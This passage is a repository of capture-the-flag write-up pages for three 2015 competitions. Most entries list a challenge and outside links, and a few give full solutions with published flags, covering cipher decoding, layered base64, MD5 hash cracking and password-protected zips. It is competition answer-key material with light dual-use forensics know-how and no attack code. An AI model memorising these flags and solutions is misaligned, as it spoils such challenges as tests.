> NIH Inc. developed its own proxy server. I've heard its firewall is impenetrable, so don't bother trying to outsmart it.
> 
> 
> Running at nih.haxdump.com port 9111
> 
> 
> Author: abuss
> 
> 
> [nih.c](./nih.c)


## Write-up

(TODO)

## Other write-ups and resources

* <https://haxdump.com/static/pwn150.txt>
* <https://b01lers.net/challenges/Haxdump%202015/NIH/35/>
# Haxdump CTF 2015: pwnxy

**Category:** Pwn
**Points:** 300
**Solves:** 3
**Description:**

> We provided you with a free proxy so you can escape the NSA!
> 
> 
> nc pwnxy.haxdump.com 1337
> 
> 
> Author: rray
> 
> 
> [pwnxy](./pwnxy)


## Write-up

(TODO)

## Other write-ups and resources

* <https://b01lers.net/challenges/Haxdump%202015/Pwnxy/34/>
* <https://gist.github.com/NickStephens/cf97f47c0df712269db6>
# Haxdump CTF 2015 write-ups

* <https://haxdump.com/>
* [Scoreboard](https://haxdump.com/scoreboard) or [local alternative](TODOLOCAL)

## Completed write-ups

* none yet

## External write-ups only

* [crypto/all-of-them](crypto/all-of-them)
* [crypto/forget-salting-and-ship-it-anyway](crypto/forget-salting-and-ship-it-anyway)
* [crypto/handwritten](crypto/handwritten)
* [crypto/more-of-them](crypto/more-of-them)
* [forensics/breadcrumbs](forensics/breadcrumbs)
* [forensics/moth-1337](forensics/moth-1337)
* [forensics/newtoy](forensics/newtoy)
* [forensics/oops](forensics/oops)
* [forensics/tom-beale-had-the-right-idea](forensics/tom-beale-had-the-right-idea)
* [pwn/nih](pwn/nih)
* [pwn/pwnxy](pwn/pwnxy)
* [recon/amanda-parkside](recon/amanda-parkside)
* [web/keep-calm-and-save-the-queen](web/keep-calm-and-save-the-queen)

## Missing write-ups# Haxdump CTF 2015: Amanda Parkside

**Category:** Recon
**Points:** 100
**Solves:** 16
**Description:**

> itstruemagic!
> 
> (And no, there's nothing wrong with Dropbox or your internet connection.)
> 
> 
> Author:cfranks


## Write-up

(TODO)

## Other write-ups and resources

* <https://haxdump.com/static/Recon100.pdf>
# Haxdump CTF 2015: Keep Calm and Save The Queen

**Category:** Web
**Points:** 100
**Solves:** 16
**Description:**

> The Queen's own online web portal thing!
> 
> 
> godsavethequeen.haxdump.com
> 
> 
> Author: rray
> 
> 
> [godsavethequeen.tar.xz](./godsavethequeen.tar.xz)


## Write-up

(TODO)

## Other write-ups and resources

* <https://b01lers.net/challenges/Haxdump%202015/Keep%20Calm%20and%20Save%20The%20Queen/33/>
# HITCON QUALS CTF 2015: guess

**Category:** Crypto
**Points:** 300
**Solves:** 
**Description:**

> Just guess.
>
> nc 52.69.244.164 9355
> 
> [guess-6e9b0ecd86686b3b630ffba9e2aba3e4](guess-6e9b0ecd86686b3b630ffba9e2aba3e4])


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/pwning/public-writeup/blob/master/hitcon2015/crypto300-guess/writeup.md>
# HITCON QUALS CTF 2015: poooooooow

**Category:** Crypto
**Points:** 200
**Solves:** 
**Description:**

> Get the flag.
>
> nc 52.69.244.164 9003
> 
> [pow-0ba8661a3fb7764ad3380a5b29117b7f.rb](pow-0ba8661a3fb7764ad3380a5b29117b7f.rb)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/pwning/public-writeup/blob/master/hitcon2015/crypto200-poooooooow/writeup.md>
# HITCON QUALS CTF 2015: random

**Category:** Crypto
**Points:** 500
**Solves:** 
**Description:**

> Completely random.
>
> nc 52.69.244.164 7603
> 
> [random-55f3d469c5e84abd1df3cc16514ecc3c](random-55f3d469c5e84abd1df3cc16514ecc3c)


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# HITCON QUALS CTF 2015: rsabin

**Category:** Crypto
**Points:** 350
**Solves:** 
**Description:**

> Classical things?
> 
> [rsabin-a51076632142e074947b08396bf35ab2.tgz](rsabin-a51076632142e074947b08396bf35ab2.tgz)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/pwning/public-writeup/blob/master/hitcon2015/crypto314-rsabin/readme.md>
# HITCON QUALS CTF 2015: simple

**Category:** Crypto
**Points:** 100
**Solves:** 
**Description:**

> Become admin!
>
> <http://52.69.244.164:51913>
> 
> [simple-01018f60e497b8180d6c92237e2b3a67.rb](simple-01018f60e497b8180d6c92237e2b3a67.rb)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/pwning/public-writeup/blob/master/hitcon2015/crypto100-simple/writeup.md>
# HITCON QUALS CTF 2015: puzzleng

**Category:** Forensic
**Points:** 250
**Solves:** 
**Description:**

> Next Generation of Puzzle!
> 
> [puzzleng-edb16f6134bafb9e8b856b441480c117.tgz](puzzleng-edb16f6134bafb9e8b856b441480c117.tgz)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/pwning/public-writeup/blob/master/hitcon2015/forensic250-puzzleng/readme.md>
# HITCON QUALS CTF 2015: fireblossom

**Category:** Misc
**Points:** 150
**Solves:** 
**Description:**

> Fireblossom is a type of Herb which appears as a small, magma-colored flower. It grows on Ash Blocks in the Underworld and can be cut with virtually any weapon or tool. You can also plant it in Clay Pots, on Planter Boxes, or on Ash Blocks using Fireblossom Seeds.
> 
> nc 52.69.206.114 10002
> 
> [fireblossom.tgz_4df066bc1cf4fc3dff4e76bda1d0bba86438f62f](fireblossom.tgz_4df066bc1cf4fc3dff4e76bda1d0bba86438f62f)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/pwning/public-writeup/blob/master/hitcon2015/misc150-fireblossom/writeup.md>
# HITCON QUALS CTF 2015: Flag not Found

**Category:** Misc
**Points:** 1
**Solves:** 
**Description:**

> Welcome to HITCON QUALS CTF 2015 Quals
>
> Find the flag in ctf2015.hitcon.org


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/pwning/public-writeup/blob/master/hitcon2015/misc1-flag_not_found/writeup.md>
# HITCON QUALS CTF 2015: hard to say

**Category:** Misc
**Points:** 4 * 50
**Solves:** 
**Description:**

> Ruby on Fails.
>
> FLAG1: nc 54.199.215.185 9001
>
> FLAG2: nc 54.199.215.185 9002
>
> FLAG3: nc 54.199.215.185 9003
>
> FLAG4: nc 54.199.215.185 9004
> 
> [hard_to_say-151ba63da9ef7f11bcbba93657805f85.rb](hard_to_say-151ba63da9ef7f11bcbba93657805f85.rb)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/pwning/public-writeup/blob/master/hitcon2015/misc200-hardtosay/readme.md>
# HITCON QUALS CTF 2015: moonglow

**Category:** Misc
**Points:** 300
**Solves:** 
**Description:**

> Moonglow is a type of Herb which appears as a bent stalk with a drooping blue-white flower. It grows in Jungle grass (surface Jungle and Underground Jungle) and can be cut with virtually any weapon or tool. It can also be planted in Clay Pots using Moonglow Seeds.
> 
> nc 52.69.171.132 10001
> 
> [moonglow.tgz_08f1639532677fb3f6c462cc74cd48f05dd20e60](moonglow.tgz_08f1639532677fb3f6c462cc74cd48f05dd20e60)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/pwning/public-writeup/blob/master/hitcon2015/misc300-moonglow/writeup.md>
# HITCON QUALS CTF 2015: PhishingMe

**Category:** 
**Points:** 200
**Solves:** 
**Description:**

> Sent me a .doc, I will open it if your subject is "HITCON 2015"!
>
> Find the flag under my file system. 
>
> p.s. I've enabled Macro for you. ^_________________^
>
> phishing.me.hitcon.2015@gmail.com.


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/pwning/public-writeup/blob/master/hitcon2015/misc200-phishingme/writeup.md>
# HITCON QUALS CTF 2015: blinkroot

**Category:** Pwn
**Points:** 200
**Solves:** 
**Description:**

> Blinkroot is a common herb that grows randomly on Dirt or Mud blocks, regardless of lighting or elevation, so long as there is room for it to grow and the blocks bear no grass of any kind. It is most commonly found in the underground layer and below, due to the general lack of grass in those areas. It can be harvested with any weapon or tool. Blinkroot can be planted manually using Blinkroot Seeds, which can also be planted in Clay Pots.
> 
> nc 52.68.211.239 10000
> 
> [blinkroot_b872f15bde9878674eb8d46809a6c8564c7c1280](blinkroot_b872f15bde9878674eb8d46809a6c8564c7c1280)
>
> [libc-3f6aaa980b58f7c7590dee12d731e099.so.6](libc-3f6aaa980b58f7c7590dee12d731e099.so.6)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/pwning/public-writeup/blob/master/hitcon2015/pwn200-blinkroot/writeup.md>
* <https://kt.pe/blog/2015/10/hitcon-2015-quals-blinkroot/>
# HITCON QUALS CTF 2015: deathweed

**Category:** pwn
**Points:** 500
**Solves:** 
**Description:**

> Deathweed is a type of Herb which appears as a short, withered stalk. In a Corruption world, it can be found growing naturally on Corrupt Grass and Ebonstone, while in a Crimson world it grows on Crimstone and Crimson Grass. Deathweed can also be planted in a Clay Pot using Deathweed Seeds.
> 
> nc 52.69.101.146 10005
> 
> [deathweed_f505a49ec16ab6a6af877991786451b3e80518ba](deathweed_f505a49ec16ab6a6af877991786451b3e80518ba)


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# HITCON QUALS CTF 2015: Fooddb

**Category:** Pwn
**Points:** 500
**Solves:** 
**Description:**

> Do you want some delicious food ?
>
> nc 52.68.53.28 0xdada
> 
> [fooddb-e303c9bc733ca06044a7bd2b6ea12129](fooddb-e303c9bc733ca06044a7bd2b6ea12129)
>
> [libc-3f6aaa980b58f7c7590dee12d731e099.so.6](libc-3f6aaa980b58f7c7590dee12d731e099.so.6)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/pwning/public-writeup/blob/master/hitcon2015/pwn500-fooddb/readme.md>
# HITCON QUALS CTF 2015: matrix X matrix

**Category:** Pwn
**Points:** 175
**Solves:** 
**Description:**

> Matrix is magic ！！！
>
> nc 52.68.53.28 31337
> 
> [matrix-a0e5c5c0a8f05896a7f03d8ed4588027](matrix-a0e5c5c0a8f05896a7f03d8ed4588027)
>
> [libc-3f6aaa980b58f7c7590dee12d731e099.so.6](libc-3f6aaa980b58f7c7590dee12d731e099.so.6)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/pwning/public-writeup/blob/master/hitcon2015/pwn175-matrix/writeup.md>
* [Japanese](http://charo-it.hatenablog.jp/entry/2015/10/26/005554)
# HITCON QUALS CTF 2015: nanana

**Category:** Pwn, Web
**Points:** 200
**Solves:** 
**Description:**

> get the shell!
>
> <http://54.92.88.102>


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/pwning/public-writeup/blob/master/hitcon2015/web200-nanana/writeup.md>
* [Chinese](http://drops.wooyun.org/web/9845)
# HITCON QUALS CTF 2015: readable

**Category:** Pwn
**Points:** 300
**Solves:** 
**Description:**

> Can you read everything ?
>
> nc 52.68.53.28 56746
> 
> [readable-9e377f8e1e38c27672768310188a8b99](readable-9e377f8e1e38c27672768310188a8b99)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/pwning/public-writeup/blob/master/hitcon2015/pwn300-readable/writeup.md>
# HITCON QUALS CTF 2015: Use-After-FLEE

**Category:** Pwn, Web
**Points:** 500
**Solves:** 
**Description:**

> Upload your SHELL and bypass the restriction :)
>
> p.s. maybe you can solve this immediately if you have 0day :)
>
> <http://52.69.8.207>


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/pwning/public-writeup/blob/master/hitcon2015/web500-use-after-flee/writeup.md>
* [Chinese](http://drops.wooyun.org/web/9845)
# HITCON QUALS CTF write-ups

* <https://ctf2015.hitcon.org/>
* [Scoreboard](https://ctf2015.hitcon.org/scoreboard.html) or [local alternative](./scoreboard)

## Completed write-ups

* [stego/piranha-gun](stego/piranha-gun)
* [stego/unreadable](stego/unreadable)

## External write-ups only

* [crypto/guess](crypto/guess)
* [crypto/poooooooow](crypto/poooooooow)
* [crypto/rsabin](crypto/rsabin)
* [crypto/simple](crypto/simple)
* [forensic/puzzleng](forensic/puzzleng)
* [misc/fireblossom](misc/fireblossom)
* [misc/flag-not-found](misc/flag-not-found)
* [misc/hard-to-say](misc/hard-to-say)
* [misc/moonglow](misc/moonglow)
* [misc/phishingme](misc/phishingme)
* [pwn/blinkroot](pwn/blinkroot)
* [pwn/fooddb](pwn/fooddb)
* [pwn/matrix-x-matrix](pwn/matrix-x-matrix)
* [pwn/nanana](pwn/nanana)
* [pwn/readable](pwn/readable)
* [pwn/use-after-flee](pwn/use-after-flee)
* [reverse/npc](reverse/npc)
* [reverse/risky](reverse/risky)
* [web/babyfirst](web/babyfirst)
* [web/giraffes-coffee](web/giraffes-coffee)
* [web/lalala](web/lalala)

## Missing write-ups

* [crypto/random](crypto/random)
* [pwn/deathweed](pwn/deathweed)
* [reverse/vcopy](reverse/vcopy)
* [stego/waterleaf](stego/waterleaf)# HITCON QUALS CTF 2015: npc

**Category:** Reverse
**Points:** 400
**Solves:** 
**Description:**

> NPC says "I am NPC."

> 
> [npc-4bc7ebfe94c8fdc93832bc0e7af1279b](npc-4bc7ebfe94c8fdc93832bc0e7af1279b)
> 
> Hint
>
> Check the black/white connected components in 2D grid of cells.


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/pwning/public-writeup/blob/master/hitcon2015/reverse400-npc/readme.md>
# HITCON QUALS CTF 2015: risky

**Category:** Reverse
**Points:** 300
**Solves:** 
**Description:**

> RISKY machine
> 
> [risky-13de1366628df39000749a782f69d894](risky-13de1366628df39000749a782f69d894)


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/pwning/public-writeup/blob/master/hitcon2015/rev300-risky/writeup.md>
# HITCON QUALS CTF 2015: vcopy

**Category:** Reverse
**Points:** 400
**Solves:** 
**Description:**

> The compiler sucks
> 
> [vcopy-105bec01b41b299429122f48a68fc9b1](vcopy-105bec01b41b299429122f48a68fc9b1)


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# HITCON QUALS CTF 2015: Piranha Gun

**Category:** Stego
**Points:** 50
**Solves:** 
**Description:**

> The Piranha Gun is a post-Plantera Hardmode ranged weapon that fires a single, returning "piranha" projectile that costs no ammunition.
>
> nc 54.178.235.243 10004


## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on a writeup by [Nandy Narwhals](http://nandynarwhals.org/2015/10/19/hitcon-2015-qualifiers-piranha-gun-stego/).

Connecting to the server, we get a shell as root.

`ls` does give us a README:

```bash
$ ls
ls
README
$ cat README
The Piranha Gun can be found in "jungle.chest".
```

Inside the `/proc/mounts` file, we see a mounted device named `chest` that we can unmount to reveal a hidden file in `/chest/`:

```bash
$ ls -la /chest
ls -la /chest
drwxr-xr-x  2 nobody nogroup 4096 Oct 16 13:31 .
drwxr-xr-x 23 nobody nogroup 4096 Oct 16 13:29 ..
$ cat /proc/mounts | grep chest
cat /proc/mounts | grep chest
/dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d /chest ext4 rw,relatime,discard,data=ordered 0 0
$ umount /chest
$ ls -la /chest
ls -la /chest
total 12
drwxr-xr-x  2 nobody nogroup 4096 Oct 16 13:31 .
drwxr-xr-x 23 nobody nogroup 4096 Oct 16 13:29 ..
-rw-r--r--  1 nobody nogroup   42 Oct 16 13:08 jungle.chest
$ cat /chest/jungle.chest
cat /chest/jungle.chest
hitcon{Wh1re d!d Y0u F1nd the Jungle Key}
```

The key is `hitcon{Wh1re d!d Y0u F1nd the Jungle Key}`.

## Other write-ups and resources

* <https://github.com/pwning/public-writeup/blob/master/hitcon2015/stego50-piranha_gun/writeup.md>
* <http://nandynarwhals.org/2015/10/19/hitcon-2015-qualifiers-piranha-gun-stego/>
* <https://www.youtube.com/watch?v=wXF65WSW2RI>
* <https://kt.pe/blog/2015/10/hitcon-2015-quals-piranha-gun/>
# HITCON QUALS CTF 2015: unreadable

**Category:** Stego
**Points:** 100
**Solves:** 
**Description:**

> Can you read me?
> 
> [unreadable-4b2868cc26a8dad5695e537a9dd8a164](unreadable-4b2868cc26a8dad5695e537a9dd8a164)


## Write-up

by [polym](https://github.com/abpolym)

We are given random data. Opening the data with any hexeditor of our choice that shows the content both in hexadecimal and ASCII, we see a hidden flag in the ASCII section:

![](./xxd.png)

The final flag is: `hitcon{WE USE XXD INSTEAD OF IDA PRO}`



## Other write-ups and resources

* <https://github.com/pwning/public-writeup/blob/master/hitcon2015/stego100-unreadable/writeup.md>
# HITCON QUALS CTF 2015: waterleaf

**Category:** Stego
**Points:** 150
**Solves:** 
**Description:**

> Waterleaf is a type of Herb which appears as a very small, aqua-colored sprout. It grows on Sand and Pearlsand blocks in any type of Desert biome and can be cut with virtually any weapon or tool. It can also be planted in Clay Pots using Waterleaf Seeds. The Waterleaf takes the longest to bloom out of all the herbs.
> 
> 
> [waterleaf_f33ea69faae677575c217eaa86f3244e973d2e91.avi](https://mega.nz/#!3EclACgQ!9It9MkecgJWyxtprzcNqEMBXHQTn-GVMVDAYPDizotk)
> 
> Hint
>
> Hint1. With the "waves" covering the video, the flag can tolerate cropping and resizing.
>
> Hint2. <http://i.imgur.com/LAmaD8a.png>


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# HITCON QUALS CTF 2015: babyfirst

**Category:** Web
**Points:** 100
**Solves:** 
**Description:**

> baby, do it first.
>
> <http://52.68.245.164>


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/pwning/public-writeup/blob/master/hitcon2015/web100-babyfirst/writeup.md>
* [Chinese](http://drops.wooyun.org/web/9845)
# HITCON QUALS CTF 2015: Giraffe's Coffee

**Category:** Web
**Points:** 300
**Solves:** 
**Description:**

> Find the flag!
>
> <http://52.69.0.204>


## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/pwning/public-writeup/blob/master/hitcon2015/web300-giraffes-coffee/readme.md>
* [Chinese](http://drops.wooyun.org/web/9845)
# HITCON QUALS CTF 2015: lalala

**Category:** Web
**Points:** 400
**Solves:** 
**Description:**

> get the shell!
>
> <http://54.65.226.23>


## Write-up

(TODO)

## Other write-ups and resources

* <https://docs.google.com/document/d/1eALKwCyogM5Mw_D4qWe48X-PAGZw_2vT82aP0EPIr-8/mobilebasic?pli=1>
# IBTeam Blackvalentine CTF 2015: Crypto1 100

**Category:** Crypto
**Points:** 100
**Author:** arieftirta
**Description:**

> * [crypto-1](crypto-1)

## Write-up

by [unicornsasfuel](https://github.com/unicornsasfuel)

The hint suggests that the ciphertexts are related. Ciphertext #1 is very clearly just backwards, giving us the text:
```
"Beware the ARPANET, my son; The bits that byte,"
```
This bears resemblence to the gibberish poem "Jabberwocky" by Lewis Carroll:
```
"Beware the Jabberwock, my son! The jaws that bite, the claws that catch!"
```

Ciphertext #2 is a simple substitution cipher: With some resemblance to the letter patterns and word lengths of the line:
```
"Twas brillig, and the slithy toves did gyre and gimble in the wabe"
```
After doing some letter substitution we arrive at the solution to ciphertext #2:
```
"TWAS BRILLIG, AND THE PROTOCOLS DID USER-SERVER IN THE WABE"
```

Ciphertext #3 is clearly 1337-speak. Applying the original Lewis Caroll line:
```
"All mimsy were the borogoves, and the mome raths outgrabe"
```
to the horribly unreadable leetspeak:
```
qll mi/|\sey wa? the F||?,An|] |he RJ& <>utg|2abe,
```
We get, with some guessing involved:
```
all mimsey was the (AR)?, and the (RJG)? outgrabe,
```

Ciphertext #4 is navajo code, and translates to:
```
THEY HEADSTHAT SCRATCH
```

Putting the lines in the order they appear in the original poem, we get:
```
"Twas brillig, and the protocols did user-server in the wabe
all mimsey was the AR, and the RJG outgrabe,
Beware the ARPANET my son; the bits that byte, they heads that scratch"
```

NOTE: As this was solved after the CTF ended, it's not clear if this reassembled poem was the flag or not, but this at least provides the steps to decrypting the ciphertexts.


## Other write-ups and resources

* none yet
# IBTeam Blackvalentine CTF 2015: Crypto2 200

**Category:** Crypto
**Points:** 200
**Author:** arieftirta
**Description:**

> * [crypto-2](crypto-2)

## Write-up

by [unicornsasfuel](https://github.com/unicornsasfuel)

The ciphertext:

```
3 444 0 22 2 555 444 55 0 8 444 777 2 444 0 6 33 777 2 44
```

is written using multi-tap ABC, an early method of writing text messages using only a numeric keypad. Each number corresponds to a particular subset of the alphabet. The number of presses correspond to the particular letter in the number's associated letter set.

The tool located [here](http://www.dcode.fr/multitap-abc-cipher) will quickly produce the answer.

The answer is: di balik terai merah

## Other write-ups and resources

* none yet
# IBTeam Blackvalentine CTF 2015: Crypto3 350

**Category:** Crypto
**Points:** 350
**Author:** arieftirta
**Description:**

> * [crypto-3](crypto-3)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# IBTeam Blackvalentine CTF 2015: Crypto4 200

**Category:** Crypto
**Points:** 200
**Author:** abdilahrf
**Description:**

> * [dancing.png](dancing.png)

## Write-up

by [polym](https://github.com/abpolym)

We are given a sequence of dancing figures as ciphertext:

![](dancing.png)

These dancing men originate from Arthur Conan Doyle's short story "The Adventure of the Dancing Men" [[1](http://people.csail.mit.edu/hasinoff/pubs/hasinoff-quipster-2003.pdf)], which gives us this key:

![http://www.identifont.com/samples/gutenberg-labo/DancingMen.gif](DancingMen.gif)

A flag in the hand of a stick figure means a word ends. However, we don't have these kind of stick figures.

Beginning at the first stick figure without a flag as `A`, we can translate the ciphertext.

The flag is `chincopachincopa`.

## Other write-ups and resources

* none yet
# IBTeam Blackvalentine CTF 2015: Forensic1 100

**Category:** Forensic
**Points:** 100
**Author:** mirfansulaiman
**Description:**

> hash , Password: B4JAkL4uT1bUk0t4J4kaRT4
>
> http://ctf.web-attack.info/misssion/6

## Write-up

by [polym](https://github.com/abpolym)

We are given a password-protected zip, which we can unpack using the provided password `B4JAkL4uT1bUk0t4J4kaRT4`.

This yields a picture `wallpaper.jpg` and yet another password-protected zip `clue.zip`.

Running `exiftool` on the JPEG gives us another clue:

```bash
$ exiftool wallpaper.jpg
[...]
XP Title                        : Musuh betmen
XP Comment                      : OWIxYTgxZmUwYzcyMGMwZGUyMWQ4MTVlNDM1ZDI5MWQ=
XP Author                       : IBTeam Jabodetabek
[...]
```

The `XP Comment` looks base64 encoded, so we decode it using `base64`:

```bash
$ echo OWIxYTgxZmUwYzcyMGMwZGUyMWQ4MTVlNDM1ZDI5MWQ= | base64 --decode
9b1a81fe0c720c0de21d815e435d291d
```

This looks like a MD5 hash, which we can crack using a [hash cracker](https://github.com/YASME-Tim/crypto-tools/tree/master/crackmd5)

```bash
$ python go.py 9b1a81fe0c720c0de21d815e435d291d
We did need [8] tries to crack this md5... damn :(
9b1a81fe0c720c0de21d815e435d291d MD5 :j0k3r
```

We can now unpack the password-protected zip:

```bash
$ 7z x clue.zip -p"j0k3r"

7-Zip [64] 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18
p7zip Version 9.20 (locale=utf8,Utf16=on,HugeFiles=on,8 CPUs)

Processing archive: clue.zip

Extracting  clue
Extracting  clue/history.txt
Extracting  clue/jokerBrangkas.zip

Everything is Ok

Folders: 1
Files: 2
Size:       1951
Compressed: 1359
```

The `clue/history.txt` file contains a bunch of Indonesian text and the `clue/jokerBrangkas.zip` is another password-protected zip.

Looking at `history.txt`, we see some upper-case and numbers that don't fit in the rest of the text, so we extract these characters hoping that this is the needed password:

```bash
$ cd clue/
$ cat history.txt | grep -oE '[0-9A-Z]' | tr -d '\n'
TP4J4KAPR113UM3B9I4C
$ 7z x jokerBrangkas.zip -p"TP4J4KAPR113UM3B9I4C"

7-Zip [64] 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18
p7zip Version 9.20 (locale=utf8,Utf16=on,HugeFiles=on,8 CPUs)

Processing archive: jokerBrangkas.zip

Extracting  PL49!.txt

Everything is Ok

Size:       34
Compressed: 192
$ cat PL49\!.txt 
Selamat Coeg !

fL4G0nd0L-j0K3rS
```

The flag is `fL4G0nd0L-j0K3rS` (or something similar, Google Translate didn't help, so minor TODO here :))

## Other write-ups and resources

* none yet
# IBTeam Blackvalentine CTF 2015: Forensic2 100

**Category:** Forensic
**Points:** 100
**Author:** mirfansulaiman
**Description:**

> Clue: Wota , Password: `Nz3#s)2=1@./AS|\sas;192Sljd!*&^`
>
> http://ctf.web-attack.info/misssion/7

## Write-up

by [polym](https://github.com/abpolym)

We are given a password-protected zip and extract it given the given password.

Out comes another encrypted zip file `ke0n9.zip` and a picture `cewe.jpg`.

Running `exiftool` on the picture, we see a suspicious comment:

```bash
$ exiftool cewe.jpg
[...]
Copyright                       : IBTeam Jabodetabek
XP Comment                      : 56 6D 31 34 55 31 4E 74 56 6B 5A 4E 56 57 52 59 59 6B 5A 77 55 46 5A 73 57 6D 46 68 52 6C 4A 56 55 6D 74 30 56 31 5A 75 51 6C 6C 61 52 57 52 48 56 47 78 61 63 31 4E 75 62 46 64 69 57 45 4A 51 56 6C 5A 61 56 31 5A 56 4D 55 56 68 65 6A 41 39
XP Keywords                     : Q29iYSBsYWdpIDp2
[...]
```

We convert this hexadecimal text to ASCII text using `xxd` (and pipe the output into `xxd` to avoid scrambling our shell):

```bash
$ echo '56 6D 31 34 55 31 4E 74 56 6B 5A 4E 56 57 52 59 59 6B 5A 77 55 46 5A 73 57 6D 46 68 52 6C 4A 56 55 6D 74 30 56 31 5A 75 51 6C 6C 61 52 57 52 48 56 47 78 61 63 31 4E 75 62 46 64 69 57 45 4A 51 56 6C 5A 61 56 31 5A 56 4D 55 56 68 65 6A 41 39' | xxd -r -p | xxd
0000000: 566d 3134 5531 4e74 566b 5a4e 5657 5259  Vm14U1NtVkZNVWRY
0000010: 596b 5a77 5546 5a73 576d 4668 526c 4a56  YkZwUFZsWmFhRlJV
0000020: 556d 7430 5631 5a75 516c 6c61 5257 5248  Umt0V1ZuQllaRWRH
0000030: 5647 7861 6331 4e75 6246 6469 5745 4a51  VGxac1NubFdiWEJQ
0000040: 566c 5a61 5631 5a56 4d55 5668 656a 4139  VlZaV1ZVMUVhejA9
```

The output looks base64 encoded. Lets decode it:

```bash
$ echo [...] | xxd -r -p | base64 --decode | xxd
0000000: 566d 7853 536d 5646 4d55 6458 6246 7050  VmxSSmVFMUdXbFpP
0000010: 566c 5a61 6146 5255 526b 7457 566e 4259  VlZaaFRURktWVnBY
0000020: 5a45 6447 546c 5a73 536e 6c57 6258 4250  ZEdGTlZsSnlWbXBP
0000030: 5656 5a57 5655 3145 617a 303d            VVZWVU1Eaz0=
```

Looks like it is a recursive base64 encoded text.

After decoding it layer by layer, we come to a non-base64 encoded text:


```bash
$ echo [...] | [...] | base64 --decode | base64 --decode | xxd
0000000: 4a6b 5434 382d 4b31 6e34 4c              JkT48-K1n4L
```

Using this string `JkT48-K1n4L` as the password for the encrypted zip we get another file `r4cUn`:

```bash
$ 7z x ke0n9.zip -p"JkT48-K1n4L"

7-Zip [64] 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18
p7zip Version 9.20 (locale=utf8,Utf16=on,HugeFiles=on,8 CPUs)

Processing archive: ke0n9.zip

Extracting  ke0n9
Extracting  ke0n9/r4cUn

Everything is Ok

Folders: 1
Files: 1
Size:       25
Compressed: 286
$ cat ke0n9/r4cUn 
Fl4g ->> D3v1-Kin4L-pUtRI
```

The flag is `D3v1-Kin4L-pUtRI`.


## Other write-ups and resources

* none yet
# IBTeam Blackvalentine CTF 2015: Forensic3 100

**Category:** Forensic
**Points:** 100
**Author:** mirfansulaiman
**Description:**

> Snake , Password: P0=sK[@0-1=3Kjs!aQ|aM.2C9v?
>
> http://ctf.web-attack.info/misssion/8

## Write-up

by [polym](https://github.com/abpolym)

First, we extract the given password protected zip:

```bash
$ 7z x Forensic-3.zip -p'P0=sK[@0-1=3Kjs!aQ|aM.2C9v?'

7-Zip [64] 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18
p7zip Version 9.20 (locale=utf8,Utf16=on,HugeFiles=on,8 CPUs)

Processing archive: Forensic-3.zip

Extracting  FORENSIC SOAL 3 LEVEL 1
Extracting  FORENSIC SOAL 3 LEVEL 1/pL4n3t.mp3

Everything is Ok

Folders: 1
Files: 1
Size:       1559
Compressed: 841
```

The file `pl4n3t.mp3` actually are hexadecimal characters separated by a colon (`:`).

We transform the hex characters back to binary using `xxd`:

```bash
$ cat pL4n3t.mp3 && echo
53:58:6c:46:64:6d:46:48:57:6d:78:4d:4d:6a:6b:79:57:56:4d:35:61:6d:4a:48:5a:44:46:5a:62:55:56:6e:59:7a:4a:57:61:57:56:70:51:6d:31:61:4d:6c:59:79:57:56:68:52:5a:32:52:75:63:47:70:5a:62:56:5a:75:53:55:68:77:64:57:56:49:53:6d:35:61:56:7a:56:6f:57:6d:6c:43:4e:46:6c:70:51:54:6c:4a:51:30:70:31:5a:47:31:4b:62:31:4e:48:52:57:6c:4a:53:45:4a:70:5a:55:4e:42:4f:55:6c:44:53:6b:46:4e:56:47:73:78:59:55:56:46:61:55:6c:49:61:47:6c:6a:52:30:6f:30:5a:47:35:72:5a:31:42:54:51:6a:5a:69:62:6d:68:35:57:6a:4a:57:64:56:6c:58:57:57:39:6c:52:30:6c:7a:53:55:68:43:61:57:56:44:61:32:64:61:62:57:52:76:57:6c:4e:42:4f:55:6c:73:64:33:64:68:65:6c:55:77:57:45:52:43:63:6b:35:71:61:47:4e:4e:52:33:4d:79:54:6c:5a:33:64:32:46:36:53:58:64:59:52:45:4a:79:54:6b:52:61:59:30:31:48:63:7a:42:6a:52:6e:64:33:59:58:70:52:65:46:68:45:51:6e:4a:4f:52:47:52:6a:54:55:64:7a:65:55:31:47:64:33:64:68:65:6b:70:34:57:45:52:43:63:6b:30:7a:53:6d:4e:4e:52:33:4e:35:54:55:5a:33:64:32:46:36:57:6e:5a:59:52:45:4a:79:54:6c:52:57:59:30:31:48:63:7a:4a:4e:56:6e:64:33:59:58:70:4e:4d:56:68:45:51:6e:4a:4f:52:45:5a:6a:54:55:64:7a:4d:55:35:47:64:33:64:68:65:6d:4d:78:57:45:52:43:63:6b:35:45:61:47:4e:4e:52:33:4d:79:54:56:5a:33:64:32:46:36:57:6e:6c:59:52:45:4a:79:54:6e:70:73:59:30:31:48:63:7a:42:4e:56: